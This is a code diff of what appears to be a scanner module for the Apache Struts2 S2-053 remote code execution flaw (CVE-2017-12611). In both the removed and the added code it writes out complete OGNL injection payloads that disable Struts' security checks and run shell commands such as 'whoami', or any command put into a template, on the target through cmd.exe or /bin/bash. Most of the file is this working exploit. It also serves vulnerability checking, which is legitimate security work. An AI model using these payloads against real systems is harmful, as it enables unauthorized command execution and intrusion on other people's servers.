@@ -1,66 +1,58 @@
 #!/usr/bin/env python3
 
-'''
-name: Struts2 S2-053漏洞，又名CVE-2017-12611漏洞
-description: Struts2 S2-053漏洞可执行任意命令
-'''
-
 import re
 from app.lib.utils.request import request
-
+from app.lib.utils.encode import urlencode
+from app.lib.utils.common import get_capta
 
 class S2_053_BaseVerify:
     def __init__(self, url):
+        self.info = {
+            'name': 'S2-053漏洞,又名CVE-2017-12611漏洞',
+            'description': 'Struts2 Remote Code Execution Vulnerability, Struts 2.0.0 - 2.3.33 Struts 2.5 - Struts 2.5.10.1',
+            'date': '2017-09-06',
+            'type': 'RCE'
+        }
         self.url = url
-        self.headers = {
-                   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
-                   'Content-Type': "application/x-www-form-urlencoded",
-                  }
-        self.check_payload = {
-                    'redirectUri':'''%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#wincmd='echo OS:Windows',#linuxcmd='echo OS:Linux').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#wincmd}:{'/bin/bash','-c',#linuxcmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n'''
-                    }
-        self.cmd_payload = {
-                    'redirectUri':'''%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#wincmd='whoami',#linuxcmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#wincmd}:{'/bin/bash','-c',#linuxcmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n'''
-                    }
-
-    def check_count(self, mom_str, sub_str):
-        count = 0
-        for i in range(len(mom_str)-1): 
-            if mom_str[i:i+len(sub_str)] == sub_str:
-                count+=1
-        return count
-
-    def run(self):
         if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
-        if  '.action' not in self.url:
-            self.url = self.url + '/hello.action'
+        
+        self.capta = get_capta()
+        self.headers = {
+            'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
+            'Content-Type': "application/x-www-form-urlencoded",
+        }
+        self.payload = '''%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3D'{cmd}').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd.exe'%2C'%2Fc'%2C%23cmd%7D%3A%7B'%2Fbin%2Fbash'%2C'-c'%2C%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7D%0A'''
+    
+    def run(self):
+
+        """
+        检测是否存在漏洞
+
+        :param:
+
+        :return str True or False
+        """
         try:
-            check_req = request.post(self.url, headers = self.headers, data = self.check_payload)
-            print()
-            if check_req.status_code == 200:
-                if self.check_count(check_req.text, 'OS:Linux') == 2:
-                    cmd_req = request.post(self.url, headers = self.headers, data = self.cmd_payload)
-                    cmd_str = re.sub('\n', '', cmd_req.text)
-                    result = re.findall('<p>Your url:(.*?)</p>', cmd_str)
-                    print('存在S2-053漏洞,OS为Linux,执行whoami命令成功，其结果为:', result)
-                    return True
-                if self.check_count(check_req.text, 'OS:Windows') == 2:
-                    cmd_req = request.post(self.url, headers = self.headers, data = self.cmd_payload)
-                    cmd_str = re.sub('\n', '', cmd_req.text)
-                    result = re.findall('<p>Your url:(.*?)</p>', cmd_str)
-                    print('存在S2-053漏洞,OS为Windows,执行whoami命令成功，其结果为:', result)
-                    return True
+            self.check_payload = self.payload.format(cmd = urlencode('echo ' + self.capta))
+            post_data = 'message={data}'.format(data = self.check_payload)
+            check_req = request.post(self.url, headers = self.headers, data = post_data)
+            check_str = re.sub('\n', '', check_req.text)
+            result = re.findall('<input type="hidden" name="(.*?)" value="" id=".*?"/>', check_str)
+            if self.capta in result[0]:
+                return True
             else:
                 return False
         except Exception as e:
-            print(e)
             return False
         finally:
             pass
-
+        
 if  __name__ == "__main__":
-    S2_053 = S2_053_BaseVerify('http://192.168.30.242:8080')
+    S2_053 = S2_053_BaseVerify('http://localhost:8080/s2_053_war_exploded/index.action')
     S2_053.run()
+
+
+
 
 
